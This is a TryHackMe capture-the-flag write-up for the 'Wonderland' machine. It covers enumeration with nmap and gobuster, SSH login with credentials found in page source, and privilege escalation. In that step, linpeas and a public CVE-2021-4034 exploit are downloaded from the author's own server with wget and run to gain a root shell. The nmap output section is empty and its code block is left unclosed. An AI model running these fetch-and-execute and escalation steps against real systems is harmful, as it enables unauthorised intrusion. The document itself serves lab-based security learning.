# TryHackMe Writeup - Wonderland

This is a writeup for the TryHackMe machine "Wonderland".
Link: <https://tryhackme.com/room/wonderland>

This machine does not offer many information in advance. So I began with my basic reconnaissance routine after adding

```
[Machine IP] machine.thm
```

to my "/etc/hosts" file with the command

```
sudo nano /etc/hosts
```

## Task 1: Reconnaissance

I initiated a nmap scan over all ports. I also used a nmap script which discovers vulnerabilities. I safed the output in a log file on my desktop:

```
sudo nmap -p- -A -Pn --script vuln machine.thm > ./Desktop/nmap.log
```

The nmap scan took a while and gave me the following output:

```

I decided to visit the webpage. I used the Bursuit browser to be able to have a look on the requests if it is necessary.

When accessing the webpage, the following screen appears:

![grafik.png](./images/wonderland/grafik.png)

While inspecting the image, I discovered that the image is stored in a "/img" directory which might be accessible:

![grafik (2).png](./images/wonderland/grafik%20%282%29.png)

This was also found by the nmap scan before.

I also started an enumeration of the website to detect possible subpages with gobuster:

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://machine.thm
```

Gobuster found the following subpages:

```
/img                  (Status: 301) [Size: 0] [--> img/]
/index.html           (Status: 301) [Size: 0] [--> ./]
/r                    (Status: 301) [Size: 0] [--> r/]
```

The "/img" directory only contained some images. I also tried enumeration on the "/img" directory but no subpages were discovered.

So I checked the "/r" directory and found the following:

![grafik (3).png](./images/wonderland/grafik%20%283%29.png)

It seems like I am on the right track. I also tried enumeration on this subpage:

```
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://machine.thm/r  
```

It found a "/a" subpage:

```
/a                    (Status: 301) [Size: 0] [--> a/]
/index.html           (Status: 301) [Size: 0] [--> ./]
```

I had an idea where this was leading and made an educated guess and tried to access the page "machine.thml/r/a/b/b/i/t". It worked and this page appeared:

![grafik (4).png](./images/wonderland/grafik%20%284%29.png)

I once again inspected the source code of the webpage and discovered the following:

![grafik (5).png](./images/wonderland/grafik%20%285%29.png)

In an invisible paragraph there is a username and password combination stored. Maybe this is for ssh access to the server?

## Task 2: Get access

I tried to login via ssh with the previously discovered credentials:

```
ssh alice@machine.thm
```

It worked. I am logged in as alice to wonderland. 

![grafik (6).png](./images/wonderland/grafik%20%286%29.png)

I tried to access the root.txt file but the access is denied. So I had to dig deeper to become root.

## Task 3: Privilege Escalation

I already have a folder with some useful scripts which contains the "linpeas.sh". The "linpeas.sh" file can be downloaded here: <https://github.com/carlospolop/PEASS-ng/releases/tag/20231029-83b8fbe1>

I then started a simple webserver in this folder:

```
python3 -m http.server
```

On the wonderland machine I then downloaded the linpeas.sh file with

```
wget [MY IP]:8000/linpeas.sh
```

gave it execution permissions with

```
chmod u+x linpeas.sh
```

and executed it with

```
./linpeas.sh
```

The "linpeas.sh" script is a linux privilege escalation script which searches for possible ways to escalate the current user privileges to root privileges. The script tells us that the host is possibly vulnerable to CVE-2021-4034

![grafik (7).png](./images/wonderland/grafik%20%287%29.png)

I had a quick research and found the following exploit which I downloaded and provided on my webserver as well: <https://github.com/joeammond/CVE-2021-4034.git>

I then downloaded the python exploit file to the wonderland machine with 

```
wget [MY IP]:8000/CVE-2021-4034.py
```

gave it execution permissions with

```
chmod u+x CVE-2021-4034.py
```

and executed it with

```
./CVE-2021-4034.py
```

which opened a shell.

With 

```
whoami
```

I got the reply "root". So we got a root shell. 

## Task 4: Capture the flags

Now we should be able to retrieve all flags easily be searching for them:

The first flag is called user.txt and I searched for it with the call

```
sudo find user.txt / | grep user.txt
```

The flag is located in "/root/user.txt".

I already found the second flag and it is located in the home directory of alice.

In my opinion this is a nice little CTF machine but it is very easy to solve. So the TryHackMe score "medium" is not really correct and it should be easy instead.
